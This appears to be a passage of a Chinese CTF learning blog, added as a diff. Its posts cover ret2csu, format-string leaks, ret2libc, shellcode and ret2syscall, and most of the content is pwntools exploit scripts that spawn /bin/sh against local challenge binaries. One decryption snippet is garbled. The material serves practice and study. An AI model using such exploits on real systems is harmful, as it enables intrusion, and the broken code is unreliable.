+padding = b&#39;a&#39; * 24  # 覆盖缓冲区
+
+# 使用csu_init中的gadgets
+csu_pop = 0x4013AA    # 弹出寄存器的地址
+csu_call = 0x401390   # 调用函数的地址
+
+# 构造ROP链
+payload = padding
+payload += p64(csu_pop)
+payload += p64(0)      # rbx
+payload += p64(1)      # rbp
+payload += p64(elf.got[&#39;write&#39;])  # r12 -&gt; 要调用的函数地址
+payload += p64(8)      # r13 -&gt; rdx (长度)
+payload += p64(elf.got[&#39;write&#39;]) # r14 -&gt; rsi (buffer地址)
+payload += p64(1)      # r15 -&gt; rdi (文件描述符)
+payload += p64(csu_call)  # 调用write(1, write@got, 8)
+payload += b&#39;B&#39;*56     # 填充剩余空间
+payload += p64(elf.symbols[&#39;main&#39;]) # 返回main重新执行
+
+# 发送加密后的payload
+p.sendline(enc(payload))
+
+# 接收泄露的地址
+real_address = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+libc_base = write_addr - libc.symbols[&#39;write&#39;]
+log.success(f&quot;libc base: &#123;hex(libc_base)&#125;&quot;)
+
+# 第二阶段：执行system(&quot;/bin/sh&quot;)
+system_addr = libc_base + libc.symbols[&#39;system&#39;]
+bin_sh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))
+
+# 构造新payload
+payload2 = padding
+payload2 += p64(0x40101a)    # 栈对齐用的ret指令
+payload2 += p64(0x4013b3)    # pop rdi; ret
+payload2 += p64(bin_sh)      # 参数：/bin/sh地址
+payload2 += p64(system_addr) # 调用system
+
+# 发送并获取shell
+p.sendline(enc(payload2))
+p.interactive()
+</code></pre>
+<p>先要找到rdi，rsi的地址。不找write的plt和got表也行。直接elf打开</p>
+<p>再找一个ret的地址。用来栈对齐。（这段没写完，解密有点问题。导致接收不到）</p>
+<pre><code class="language-python">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./ret2csu&#39;)
+elf=ELF(&#39;./ret2csu&#39;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+#jiemi
+def dec(data):
+    # 解密过程：先异或还原，再逆向位移操作
+    result = []
+    for byte in data:
+        xor_byte = byte ^ 0x5A
+        # 2. 逆向位移操作（加密是右移3位+左移5位）
+        # 解密需要左移3位 + 右移5位（合并后等价循环左移3位）
+        original = ((xor_byte &gt; 5)) &amp; 0xFF
+        result.append(original)
+    return bytes(result)
+#address
+gadget2=0x401390
+gadget1=0x4013AA
+write_got=elf.got[&#39;write&#39;]
+write_plt=elf.plt[&#39;write&#39;]
+main_addr=elf.symbols[&#39;main&#39;]
+pop_rdi_ret=0x4013b3
+pop_rsi_ret=0x4013b1
+ret=0x40101a
+
+#first payload
+payload=b&#39;a&#39;*0x18
+payload+=p64(gadget1)
+payload+=p64(0)
+payload+=p64(1)
+payload+=p64(1)
+payload+=p64(write_got)
+payload+=p64(8)
+payload+=p64(write_got)
+payload+=p64(gadget2)
+payload+=b&#39;a&#39;*0x38
+payload+=p64(main_addr)
+
+p.sendline(dec(payload))
+p.sendline(payload)
+p.recvuntil(b&#39;Encrypted: &#39;)
+p.recvuntil(b&#39;\n&#39;)
+
+real_address = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
+print(&quot;real_address: &quot;,hex(real_address))
+#count libc,system,bin/sh
+libc_base = real_address -libc.sym[&#39;write&#39;]
+system_address = libc_base + libc.sym[&#39;system&#39;]
+binsh_address = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+
+#second payload
+payload=b&#39;a&#39;*0x18
+payload+=p64(ret)
+payload+=p64(pop_rdi_ret)
+payload+=p64(binsh_address)
+payload+=p64(system_address)
+
+p.sendline(dec(payload))
+p.sendline(payload)
+p.interactive()
+</code></pre>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #00a596">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/fmt/" style="color: #03a9f4">fmt</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/ret2csu/" style="color: #00bcd4">ret2csu</a>
+        </span>
+        
+    </div>
+    <a href="/2025/05/25/fmt%E5%92%8Cretcsu/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/05/20/fmt/">
+        <h2 class="post-title">格式化字符串漏洞</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/20
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>%*X$c%Y$n 会把偏移X处的值赋给栈中偏移Y处指针指向的地址</p>
+<p><code>%x</code>、<code>%s</code>、<code>%n</code> 这些格式控制符，<code>printf</code> 会把它们当作指示去处理，而去读取栈上的其他内容  </p>
+<h1 id="寄存器是为了访问速度更加的快设计的"><a href="#寄存器是为了访问速度更加的快设计的" class="headerlink" title="寄存器是为了访问速度更加的快设计的"></a>寄存器是为了访问速度更加的快设计的</h1><p>顺序是这样的</p>
+<p>在 x86_64 架构（也就是 64位）的 System V 调用约定中，<strong>前六个整数或指针类型参数</strong>会依次通过寄存器传递，顺序如下：</p>
+<ol>
+<li><strong>RDI</strong></li>
+<li><strong>RSI</strong></li>
+<li><strong>RDX</strong></li>
+<li><strong>RCX</strong></li>
+<li><strong>R8</strong></li>
+<li><strong>R9</strong></li>
+</ol>
+<p>而当处于系统调用（<code>syscall</code>）上下文时，调用约定略有不同，传递参数的顺序变为：</p>
+<ol>
+<li><strong>RDI</strong></li>
+<li><strong>RSI</strong></li>
+<li><strong>RDX</strong></li>
+<li><strong>R10</strong> （替代用户空间中的 RCX）</li>
+<li><strong>R8</strong></li>
+<li><strong>R9</strong><br>这是因为 <code>syscall</code> 指令会用 RCX 暂存返回指令地址，因而无法用于传参，因此内核使用 R10 来替代将原 RCX 的位置</li>
+</ol>
+<p>还有通用寄存器</p>
+<ul>
+<li>原始 x86 扩展寄存器：</li>
+<li><code>rax</code>, <code>rbx</code>, <code>rcx</code>, <code>rdx</code></li>
+<li><code>rsi</code>, <code>rdi</code>, <code>rbp</code>（基址指针），<code>rsp</code>（栈顶指针）</li>
+<li>新增的 64 位寄存器（x64 模式新增）：</li>
+<li><code>r8</code>, <code>r9</code>, <code>r10</code>, <code>r11</code>, <code>r12</code>, <code>r13</code>, <code>r14</code>, <code>r15</code></li>
+</ul>
+<p>32位是rax eax</p>
+<p>不同的功能</p>
+<ul>
+<li><code>rax</code>: 存储系统调用号</li>
+<li><code>rdi</code>: 存储文件名或文件描述符</li>
+<li><code>rsi</code>: 存储缓冲区地址</li>
+<li><code>rdx</code>: 存储字节数</li>
+</ul>
+<p>orw时寄存器参数设置</p>
+<p>read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器</p>
+<ul>
+<li><code>**RDI**</code> 寄存器 &#x3D; <strong>地址</strong> of “&#x2F;bin&#x2F;sh” 字符串</li>
+<li><code>**RSI**</code> &#x3D; 0</li>
+<li><code>**RDX**</code> &#x3D; 0</li>
+<li><code>**RAX**</code> &#x3D; 系统调用号</li>
+<li>然后执行 <code>**syscall**</code></li>
+</ul>
+<p>可以这么来理解：</p>
+<p>选好了合适的函数名（某个特殊寄存器的特殊的值），你设定好了参数（其他寄存器的特殊的值），并call 这个函数（一个特殊的语句），就能够执行这个函数（产生作用）</p>
+<pre><code class="language-plain">rop寻找bin/sh
+
+ROPgadget --binary retsyscall  --string &#39;/bin/sh&#39;
+</code></pre>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb，因为是execve所以是0xb</li>
+<li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>payload实现</p>
+<pre><code class="language-plain">payload=b&#39;a&#39;*112+\      #112为实际栈溢出的偏移          
+        p32(gadget_eax_ret_addr)+p32(0xb)+ \
+        p32(gadget_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bin_sh_addr)+ \
+        p32(int_0x80_addr)
+</code></pre>
+<h1 id="查看libc版本号"><a href="#查看libc版本号" class="headerlink" title="查看libc版本号"></a>查看libc版本号</h1><p>strings libc.so.6 | grep GLIBC_</p>
+<p>修改替换libc文件</p>
+<pre><code class="language-python">patchelf --replace-needed libc.so.6 /home/yh3h636/桌面/libc.so.6 heap
+</code></pre>
+<p>libc和ld需要保持版本一致</p>
+<p>设置ld文件。在文件夹里找到对应的ld版本修改名称，最后写链接的文件名</p>
+<pre><code class="language-python">patchelf --set-interpreter /home/yh3h636/桌面/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-linux-x86-64.so.2 --set-rpath /home/yh3h636/桌面/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ ./heap
+</code></pre>
+<h2 id="怎么找到-one-gadget"><a href="#怎么找到-one-gadget" class="headerlink" title="怎么找到 one_gadget"></a>怎么找到 one_gadget</h2><p>比如：</p>
+<p>onegadget获取偏移</p>
+<pre><code class="language-python">one_gadget libc-2.23.so
+</code></pre>
+<p>会列出一堆候选地址，大概长这样：</p>
+<pre><code class="language-plain">cpp
+
+
+复制编辑
+0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  rsp+0x30 == NULL
+</code></pre>
+<p>这表示在 <code>libc</code> 偏移 <code>0x45216</code> 的位置有个 gadget，可以直接调用 <code>execve(&quot;/bin/sh&quot;, ...)</code>。</p>
+<hr>
+<h2 id="2-one-gadget-的“调用条件”（constraints）"><a href="#2-one-gadget-的“调用条件”（constraints）" class="headerlink" title="2. one_gadget 的“调用条件”（constraints）"></a>2. one_gadget 的“调用条件”（constraints）</h2><p>one_gadget 通常会附带一些 <strong>约束条件</strong>，因为它利用了 <code>libc</code> 内部某些代码路径，这些路径对寄存器 &#x2F; 内存有要求。</p>
+<pre><code class="language-plain">yaml
+
+
+复制编辑
+0x45216: execve(&quot;/bin/sh&quot;, rsp+0x30, environ)
+constraints:
+  rsp+0x30 == NULL
+</code></pre>
+<p>意思是：</p>
+<ul>
+<li>调用这个 gadget 时，它会尝试执行 <code>execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</code></li>
+<li>要求 <code>**rsp+0x30**</code>** 指向的内存必须是 NULL**<br>→ 因为 <code>argv</code> 参数需要是 <code>NULL</code> 结尾的指针数组</li>
+</ul>
+<p>如果条件不满足，<code>execve</code> 调用就会失败（可能直接崩溃）。</p>
+<h2 id="为什么会有这些条件？"><a href="#为什么会有这些条件？" class="headerlink" title="为什么会有这些条件？"></a>为什么会有这些条件？</h2><p>因为 one_gadget 本质上不是“万能的 gadget”，而是 <code>libc</code> 内部某条执行路径（比如 <code>execve</code> 的某个错误分支、某个初始化流程），这条路径在调用时默认假定某些寄存器 &#x2F; 内存布局已经满足条件。<br>所以用它时必须保证这些前置约束成立，否则就不能直接 getshell。</p>
+<h2 id="常见-gadget-类型"><a href="#常见-gadget-类型" class="headerlink" title="常见 gadget 类型"></a>常见 gadget 类型</h2><ul>
+<li><strong>寄存器传参 gadget</strong></li>
+</ul>
+<pre><code class="language-plain">pop rdi ; ret     ; 控制 RDI
+pop rsi ; ret     ; 控制 RSI
+pop rdx ; ret     ; 控制 RDX
+</code></pre>
+<p>用来构造函数调用参数。</p>
+<h3 id="栈迁移-gadget"><a href="#栈迁移-gadget" class="headerlink" title="栈迁移 gadget"></a><strong>栈迁移 gadget</strong></h3><ol>
+<li></li>
+</ol>
+<pre><code class="language-plain">leave ; ret
+</code></pre>
+<p>可以调整栈指针，切换新的栈空间。</p>
+<p>2.gadget: </p>
+<pre><code class="language-plain">xchg esp, edi; ret
+</code></pre>
+<ul>
+<li><code>xchg esp, edi</code> &#x3D; 交换 <code>esp</code> 和 <code>edi</code> 的值。</li>
+<li>如果事先控制了 <code>edi = bss_addr</code>，那么交换之后：<ul>
+<li><code>esp</code> &#x3D; <code>bss_addr</code></li>
+<li><code>edi</code> &#x3D; 原本的 <code>esp</code></li>
+</ul>
+</li>
+<li>紧接着执行 <code>ret</code> 指令：<ul>
+<li><code>ret</code> 会做的事情是：从 <code>[rsp]</code> 取出一个地址，跳转到那里执行，然后 <code>rsp += 8</code>（在 x64 下）。</li>
+<li>由于此时 <code>rsp</code> 已经被我们换到 <code>bss_addr</code>，所以 <code>ret</code> 会把 BSS 上的数据当成“返回地址”，跳过去执行。</li>
+<li>之后的 gadget、参数都从 BSS 上连续取 → 这就是 <strong>栈迁移成功</strong>。</li>
+</ul>
+</li>
+<li><strong>任意指令 gadget</strong><br>比如：</li>
+</ul>
+<pre><code class="language-plain">add rax, 1 ; ret
+</code></pre>
+<p>可以在构造链时对寄存器做运算。</p>
+<p>把 <code>**top_chunk**</code>** 的地址伪造为某个目标地址**，那么下一次 <code>malloc</code> 返回的 chunk 就会落在目标地址上。</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/pdv5MMUQ9ACpeCpyGnxb1Q">https://mp.weixin.qq.com/s/pdv5MMUQ9ACpeCpyGnxb1Q</a></p>
+<p>%p是将对应地址存的东西打印出来，而%n是将对应的地址作为指针索引，得到对应的内容。</p>
+<p>systab 符号表</p>
+<h1 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h1><p>在ebp下面存放了一个随机值。不知道这个随机值，篡改的时候就会出错</p>
+<p>%p 会把栈上的东西打印出来。当%p足够多的时候，就会把canary打印出来</p>
+<p>%s 是打印地址存放的内容 </p>
+<p>可以用它来泄露任意地址的内容</p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #00a596">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/fmt/" style="color: #ffa2c4">fmt</a>
+        </span>
+        
+    </div>
+    <a href="/2025/05/20/fmt/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2025/05/15/libc_shellcode_syscall/">
+        <h2 class="post-title">ret2libc、shellcode 与 syscall</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="category">
+            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                二进制安全
+            </a>
+        </span>
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/15
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><p>libc题，直接套模板套模板</p>
+<p>反编译以后发现了一个问题。</p>
+<p>buf长度超过0x80会自动结束。怎么样让它别检测了呢</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407923-76549df7-6596-487d-ab4d-70a49c97d75f.png"></p>
+<p>后来博览群书后发现这strlen函数它有一个缺点。它读到＼0会终止计数</p>
+<p>它有一个加强版本strnlen。它遇到maxlen就会终止。就没法无限输入进去。但是遇到&#x2F;0它还是会停。</p>
+<p>这道题是strlen函数。在payload之前用＼0截断它就行</p>
+<p>然后用libc公式</p>
+<p>还要注意一个你截断了它的计数，你后面溢出的时候。就不是0x68了，就是0x67。截断的时候也占了一个字节</p>
+<pre><code class="language-python">from pwn import *
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+e = ELF(&quot;./pwn6&quot;)
+libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+p = process(&quot;./pwn6&quot;)
+gdb.attach(p, &#39;b main&#39;)
+p.recvuntil(&quot;message:&quot;)
+ret = 0x400556
+rdi = 0x4007d3
+puts_plt = e.plt[&#39;puts&#39;]
+puts_got = e.got[&#39;puts&#39;]
+main = 0x4006B0
+
+payload = b&#39;\x00&#39; 
+payload += b&#39;A&#39;* (0x67) 
+payload += p64(rdi) 
+payload += p64(puts_got) 
+payload += p64(puts_plt) 
+payload += p64(main)
+
+p.sendline(payload)
+p.recvuntil(&quot;Received\n&quot;)
+addr = u64(p.recv(6).ljust(8, b&#39;\x00&#39;))
+print(&quot;puts real addr: &quot; + hex(addr))
+
+libc_base = addr - libc.sym[&#39;puts&#39;]
+system = libc_base + libc.sym[&#39;system&#39;]
+binsh = libc_base+ next(libc.search(b&quot;/bin/sh&quot;))
+
+payload = b&#39;\x00&#39; 
+payload += b&#39;a&#39;* (0x67) 
+payload += p64(ret) 
+payload += p64(rdi) 
+payload += p64(binsh) 
+payload += p64(system)
+p.recvuntil(&quot;message:&quot;)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>这个接收recvuntil搞了半天。后面要加个\n。行了</p>
+<p>把模板稍微精简了一下？（bushi)（地址写短了）</p>
+<h2 id="ret2shellcode1"><a href="#ret2shellcode1" class="headerlink" title="ret2shellcode1"></a>ret2shellcode1</h2><p>先checksec 一下，没有canary</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407976-b2144d57-8fb6-4022-b814-df2c9f2c06a1.png"></p>
+<p>然后用直接自动生成的那个命令（下面的），不用再写汇编或者用网站转化了</p>
+<pre><code class="language-plain">payload=asm(shellcraft.sh())
+</code></pre>
+<p>然后就直接发送payload.成功了</p>
+<p>这里有个问题，第一次没加gdb attach的时候成功了，加了以后反而不行。</p>
+<p>就是下面这两个</p>
+<pre><code class="language-plain">debug_word=&#39;b main&#39;
+gdb attach(p ,debug_word )
+</code></pre>
+<p>它先运行的这个gdb.还没有到后面的程序。所以这个时候直接ls是没有结果的。要继续步进或者直接把gdb关了，才会执行后面的。</p>
+<p>构造的这个它好像直接构造了一个payload就发过去了，好像没有绕过这个nx保护。这是怎么回事。</p>
+<pre><code class="language-python">from pwn import*
+debug_word=&#39;b main&#39;
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./pwn&#39;)
+gdb.attach(p ,debug_word )
+payload=asm(shellcraft.sh())
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="ret2shellcode2"><a href="#ret2shellcode2" class="headerlink" title="ret2shellcode2"></a>ret2shellcode2</h2><p>先checksec文件（以后记得每次先给文件开个权限，报错了三次我以为我写错了）</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407860-7c35076b-fca2-47fa-b0db-48a79dcfaf1b.png"></p>
+<p>还是没有canary的shellcode，但是还有nx保护，用ida看一下。里面有mprotect这个函数，就可以直接通过这个函数把.bss段弄成可执行的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407917-b6c53fed-e031-4449-987c-5a819b43fde2.png"></p>
+<p>第一次没明白，这个在gdb里buff的地址怎么看。每次算的时候拿rdi减去0x100缓冲区算下来是高地址。只学会了在gdb里看哪一段可读可写可执行（gdb看的写到底下了，也是后来会的）</p>
+<pre><code class="language-plain">pwndebug&gt; vmmap
+</code></pre>
+<p>后来直接拿ida看了。先找到bss段，然后在里面找buff.找到之后就有了返回地址</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530407917-71388a04-4f6b-4df8-aa6c-f307d1bfc11a.png"></p>
+<p>这是exp</p>
+<pre><code class="language-python">from pwn import*
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+debug_word=&#39;b main&#39;
+p=process(&#39;./shellcode&#39;)
+gdb.attach(p, debug_word)
+shellcode=asm(shellcraft.sh())
+payload=shellcode.ljust(0x108,b&#39;A&#39;)
+payload+=p64(0x4040A0)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>其实上面第二题也可以这么写的，加上补充的。直接那样补充方便一点。</p>
+<pre><code class="language-plain"># 假设 shellcode 长度为 40 字节
+shellcode = b&quot;\x31\xc0\x48\xbb\x...\x00&quot;  # 你的实际 shellcode
+padding = b&#39;A&#39; * (0x108 - len(shellcode))  # 计算需要填充的长度
+payload = shellcode + padding + p64(0x4040A0)
+</code></pre>
+<h2 id="ret2shellcode3"><a href="#ret2shellcode3" class="headerlink" title="ret2shellcode3"></a>ret2shellcode3</h2><p>第三道</p>
+<p>先看checksec 里面有nx保护，但是吧，又跟第一道题一样，它又用了mprotect这个函数。有这个函数即使有nx保护也可以写入shellcode了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409146-71c0ec8e-59d7-46d8-b493-fadac97916ed.png"></p>
+<p>这道题有一个问题，他这个read里面只让写0x25个（最多），然后咱们上面自动生成的shellcode查阅资料后了解到一般是0x70到0x100个长度。所以这回咱们要手写一个短一点的shellcode</p>
+<p>格式基本不变。</p>
+<pre><code class="language-python">from pwn import*
+
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+debug_word=&#39;b main&#39;
+p=process(&#39;./shellcode&#39;)
+gdb.attach(p, debug_word)
+shellcode=asm() #改成具体手写
+p.sendline(shellcode)
+p.recvuntil(&quot;&quot;)#准确接收和发送，可写可不写吧
+payload=b&#39;A&#39;*(0x00+8)
+payload+=p64(0x000000)#填具体需要覆盖的缓冲区长度和返回的bss段地址
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>然后再看看具体缓冲区要填多少，返回地址在bss哪一段</p>
+<p>按照64位shellcode手写模板写一下</p>
+<p>想办法把指令缩短，但是还具有原来功能。把mov改两个，改成push和pop。</p>
+<p>试了一下发现可以了。就是这个有限制才不行的。</p>
+<p>Exp</p>
+<pre><code class="language-python">from pwn import *
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./ret2shellcode3&#39;)
+
+shellcode = asm(&#39;&#39;&#39;
+    mov rbx, 0x0068732f6e69622f
+    push rbx
+    push rsp
+    pop rdi
+    xor esi,esi
+    xor edx,edx
+    push 59
+    pop rax
+    syscall
+&#39;&#39;&#39;)
+p.recvuntil(&quot;Please.&quot;)
+p.sendline(shellcode)
+
+name_addr=0x6010A0
+payload=b&#39;A&#39;*18+p64(name_addr)
+p.recvuntil(&quot;Let&#39;s start!&quot;)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>还不太清楚每个具体的汇编到底有多少长度。目前只能靠网站看和积累了</p>
+<p>新学了两个gdb指令，看长度</p>
+<pre><code class="language-plain"> disassemble /r main #把main的汇编，汇编的长度，地址全都显示出来
+rasm2 -a x86 -b 64 &quot;pop rax&quot; #说是算单个指令长度的，算出来58我也不知道是啥
+</code></pre>
+<h2 id="写shellcode的时候注意的"><a href="#写shellcode的时候注意的" class="headerlink" title="写shellcode的时候注意的"></a>写shellcode的时候注意的</h2><h3 id="1-为什么要清空-esi-和-edx-寄存器？"><a href="#1-为什么要清空-esi-和-edx-寄存器？" class="headerlink" title="1. 为什么要清空 esi 和 edx 寄存器？"></a>1. 为什么要清空 <code>esi</code> 和 <code>edx</code> 寄存器？</h3><p>这与 Linux 系统调用 <code>execve</code> 的参数要求有关。</p>
+<p>在 64 位 Linux 中，执行系统调用（syscall）时，参数是通过特定的寄存器传递的。对于 <code>execve</code> 系统调用（系统调用号 59，即 <code>0x3b</code>），其 C 语言原型如下：</p>
+<pre><code class="language-c">int execve(const char *pathname, char *const argv[], char *const envp[]);
+</code></pre>
+<p>对应的寄存器分配是：</p>
+<ul>
+<li><code>**rax**</code>: 系统调用号 (59)</li>
+<li><code>**rdi**</code>: 第 1 个参数 <code>pathname</code> (指向 “&#x2F;bin&#x2F;sh” 字符串的地址)</li>
+<li><code>**rsi**</code>: 第 2 个参数 <code>argv[]</code> (指向参数数组的指针)</li>
+<li><code>**rdx**</code>: 第 3 个参数 <code>envp[]</code> (指向环境变量数组的指针)</li>
+</ul>
+<p><strong>为什么要清零？</strong> 当我们只是想简单地拿到一个 shell (getshell) 时，通常不需要传递任何额外的参数（<code>argv</code>），也不需要特定的环境变量（<code>envp</code>）。因此，我们将这两个参数设置为 <strong>NULL</strong>（即 0）是最方便且不容易出错的做法。</p>
+<p><strong>总结：</strong> 清空它们是为了构造 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，告诉系统“我要运行 &#x2F;bin&#x2F;sh，没有参数，没有环境变量”。</p>
+<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><p>随机数.</p>
+<p>种子固定的。本地可以生成相同的。有nx保护，但是这道题有bin&#x2F;sh.不用写shellcode或者rop链之类的。好像nx也没啥用？</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408622-51228c31-6a1f-4a79-8bbc-7269ad5b1da5.png"></p>
+<p>有现成的后门就直接用了。然后种子固定就能本地生成固定的随机数。可以用本地c语言生成对应随机数</p>
+<pre><code class="language-plain">#include 
+#include 
+int main( )&#123;
+        srand(0x39);
+        printf(&quot;Random: %d\n&quot;, rand());
+        return 0;
+&#125;
+</code></pre>
+<p>运行完是224。直接发送随机数验证的时候sendline(b’224’)又不对了</p>
+<p>我后来拿gdb调了一下。发现这个生成的随机数确实不是224</p>
+<pre><code class="language-plain"> disassemble /r vuln #计算调用rand时的偏移量
+ b *vuln+0x41 #在调用之前下断点
+ r
+ ni #步进到rand调用的时候
+ p $eax #打印此时的随机数
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408698-7e18862a-f14a-46b1-a973-ac5392d34bf2.png"></p>
+<p>到这已经能写这个exp了</p>
+<pre><code class="language-python">from pwn import*
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+debug_word=&#39;vuln&#39;
+p=process(&#39;./random&#39;)
+gdb.attach(p,debug_word)
+p.recvuntil(b&quot;name:&quot;)
+p.sendline(b&#39;1956681178&#39;)
+p.recvuntil(b&quot;next?&quot;)
+payload=b&#39;A&#39;*(0x40+8)
+payload+=p64(0x4008B6)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>但是我看资料，资料上说还有libc,本地c语言生成的还要编译？</p>
+<p>我直接看了这两种方法</p>
+<p>这个libc泄露还是撞库，只会了固定种子的。这个随机种子的话格式还不会写。</p>
+<pre><code class="language-plain">libc = CDLL(&quot;libc.so.6&quot;)
+libc.srand(0x39)
+</code></pre>
+<p>前面加上这两个就行了。对，还要引入一个工具。</p>
+<pre><code class="language-plain">from ctypes import*
+</code></pre>
+<p>然后关于c语言编译的问题。</p>
+<p>我用的是windows编译的c。而要用linux编译才对</p>
+<pre><code class="language-plain">vim text.c
+</code></pre>
+<p>然后写自己本地的c语言，写好以后gcc 编译就可以（这的gcc还不熟。没找见gcc表，就只会了两个看的。但是进去看不太懂）</p>
+<pre><code class="language-plain">gcc text.c -o text &amp;&amp;./text
+man gcc  ;看gcc指令的两个
+help gcc
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408694-a9ecb4a4-d884-42a9-8577-4fd13af8f51f.png"></p>
+<h2 id="retsyscall1"><a href="#retsyscall1" class="headerlink" title="retsyscall1"></a>retsyscall1</h2><p>构造syscall的rop链。有nx保护了。再看ida（感觉每次check完都是这）</p>
+<p>不是，为啥会有system和sh?没有bin&#x2F;sh.试试看这个sh能不能发挥以下bin&#x2F;sh的作用。这个感觉这下连rop链都不用弄了。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530408728-9f8cefe5-72d0-4e93-8392-2d54506706e6.png"></p>
+<p>把system和sh的找见就行了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409527-74ad0a3e-064f-4711-98bc-82ed396a6d78.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409569-79689a28-d223-4ac6-b96a-791b322c80b1.png"></p>
+<p>找这个又花了半天时间。字符串按u就能拆开。对ida还是不太熟悉</p>
+<p>可以了</p>
+<p>感觉跟刚开始学栈溢出做的题一样。就写个payload就行了</p>
+<pre><code class="language-sql">from pwn import*
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./ret2syscall1&#39;)
+gdb.attach(p,&#39;b main&#39;)
+system=0x8048529  
+sh=0x8048670
+payload=b&#39;A&#39;*(0x18+4)+p32(system)+p32(sh)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>为什么sh能当bin&#x2F;sh来用，是规定。sh和bin&#x2F;sh能发挥一样的作用</p>
+<h2 id="ret2syscall2"><a href="#ret2syscall2" class="headerlink" title="ret2syscall2"></a>ret2syscall2</h2><p>我觉得应该要构造rop链了</p>
+<p>先拿ida看一下。第一次见这么多函数，完了完了完了，这次有canary了</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409516-236d4647-23c0-4394-a47c-471af8501fc5.png"></p>
+<p>先分析一下ida，用gadrop命令把构造rop链需要的东西找出来</p>
+<p>这道题好像是一个游戏。还没找到漏洞.连上之后先玩一下。</p>
